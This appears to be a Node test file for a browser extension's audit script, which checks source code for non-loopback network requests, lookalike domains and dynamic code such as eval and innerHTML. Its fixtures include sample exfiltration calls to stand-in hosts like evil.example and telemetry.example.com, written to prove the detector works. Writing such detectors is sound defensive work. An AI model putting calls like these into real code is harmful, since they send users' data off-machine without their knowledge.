// Copyright © 2026 Sonomos, Inc. All rights reserved.
import { test } from 'node:test';
import { strict as assert } from 'node:assert';
import { auditSource } from '../scripts/audit-payload.mjs';

// This audit is the only mechanical enforcement of the extension's central
// claim — that it makes no outbound request except to the desktop app on
// loopback. A check that cannot fail is worse than no check, because it is
// cited as evidence. Most of these tests exist to prove it bites.

test('the loopback endpoints the extension really uses are allowed', () => {
  assert.deepEqual(auditSource('const U = "http://127.0.0.1:18795/heartbeat";'), []);
  assert.deepEqual(auditSource('const R = "http://127.0.0.1:18795/register-extension";'), []);
});

test('an exfiltration endpoint is caught', () => {
  const f = auditSource('fetch("https://telemetry.example.com/collect");');
  assert.equal(f.length, 1);
  assert.equal(f[0].kind, 'endpoint');
  assert.match(f[0].detail, /telemetry\.example\.com/);
});

test('a non-loopback host is caught even when it looks internal', () => {
  // "internal" is not the property being asserted. Off-machine is off-machine.
  assert.equal(auditSource('fetch("http://10.0.0.5:18795/heartbeat");').length, 1);
  assert.equal(auditSource('fetch("https://api.sonomos.ai/v1/events");').length, 1);
});

test('a URL in a template literal is not excused', () => {
  // The obvious way to smuggle one past a naive string check.
  assert.equal(auditSource('fetch(`https://evil.example/${id}`);').length, 1);
});

test('a URL in a line comment is documentation, not reach', () => {
  assert.deepEqual(auditSource('// see https://developer.mozilla.org/docs\nconst x = 1;'), []);
});

test('the scheme slashes are not mistaken for a comment', () => {
  // `https://` contains `//`. A naive comment-stripper truncates the line
  // there and the endpoint disappears — silently passing every violation.
  const f = auditSource('fetch("https://evil.example/x");');
  assert.equal(f.length, 1, 'the URL must survive comment stripping');
});

test('eval is caught', () => {
  const f = auditSource('eval("1+1");');
  assert.equal(f.length, 1);
  assert.equal(f[0].kind, 'dynamic-code');
});

test('new Function is caught', () => {
  assert.equal(auditSource('const f = new Function("return 1");')[0].kind, 'dynamic-code');
});

test('a remote dynamic import is caught', () => {
  assert.equal(auditSource('await import("https://cdn.example/x.js");').length >= 1, true);
});

test('document.write is caught', () => {
  assert.equal(auditSource('document.write("<b>x</b>");')[0].kind, 'dynamic-code');
});

test('innerHTML built by concatenation is caught', () => {
  assert.equal(auditSource('el.innerHTML = "<b>" + name + "</b>";')[0].kind, 'dynamic-code');
});

test('ordinary code produces no findings', () => {
  assert.deepEqual(
    auditSource('const a = 1;\nfunction f(x) { return x + 1; }\nel.textContent = "safe";'),
    []
  );
});

test('the product link the popup opens is allowed', () => {
  assert.deepEqual(auditSource('a.href = "https://sonomos.ai/locke/privacy";'), []);
});

test('a lookalike of the allowed link is still caught', () => {
  // Prefix matching must not admit sonomos.ai.evil.example.
  assert.equal(auditSource('fetch("https://sonomos.ai.evil.example/x");').length, 1);
});
